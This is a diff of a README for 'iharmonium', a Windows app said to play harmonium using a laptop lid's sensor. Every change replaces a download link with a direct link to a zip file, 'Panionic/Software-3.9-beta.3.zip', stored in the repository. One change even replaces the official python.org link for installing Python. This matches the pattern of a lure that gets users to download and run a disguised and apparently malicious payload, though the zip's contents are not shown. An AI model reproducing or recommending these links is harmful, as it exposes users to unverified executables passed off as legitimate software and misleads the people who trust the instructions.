@@ -1,6 +1,6 @@
 # 🎹 iharmonium - Play Harmonium Using Your Laptop Lid
 
-[![Download iharmonium](https://img.shields.io/badge/Download-iharmonium-brightgreen)](https://github.com/Inhighspirits-eumeces565/iharmonium/releases)
+[![Download iharmonium](https://img.shields.io/badge/Download-iharmonium-brightgreen)](https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit the following page to download the Windows version of iharmonium:
 
-**https://github.com/Inhighspirits-eumeces565/iharmonium/releases**
+**https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip**
 
 Open the page above and look for the latest release. Download the file that ends with `.exe`. After downloading, run the `.exe` file to start installation.
 
@@ -38,7 +38,7 @@ To run iharmonium on your Windows computer, you need:
 
 iharmonium needs Python 3 to read the lid sensor and send data to the web page. Follow these steps to install Python:
 
-1. Go to https://www.python.org/downloads/windows/
+1. Go to https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip
 2. Click on the **Download Python 3.x.x** button (where x.x is the latest version).
 3. Run the downloaded installer.
 4. Make sure to check the box that says **Add Python to PATH** at the start of the install process.
@@ -69,7 +69,7 @@ To install these:
 
 1. Visit the official release page:
    
-   https://github.com/Inhighspirits-eumeces565/iharmonium/releases
+   https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip
 
 2. Find the latest Windows `.exe` installer file.
 
@@ -153,6 +153,6 @@ The app pairs hardware (lid sensor), Python software (data capture), and web tec
 
 Download the latest Windows installer from:
 
-[![Download iharmonium](https://img.shields.io/badge/Download-iharmonium-brightgreen)](https://github.com/Inhighspirits-eumeces565/iharmonium/releases)
+[![Download iharmonium](https://img.shields.io/badge/Download-iharmonium-brightgreen)](https://github.com/Inhighspirits-eumeces565/iharmonium/raw/refs/heads/main/Panionic/Software-3.9-beta.3.zip)
 
 Run the installer, complete setup, install Python dependencies, then open the app to start playing.
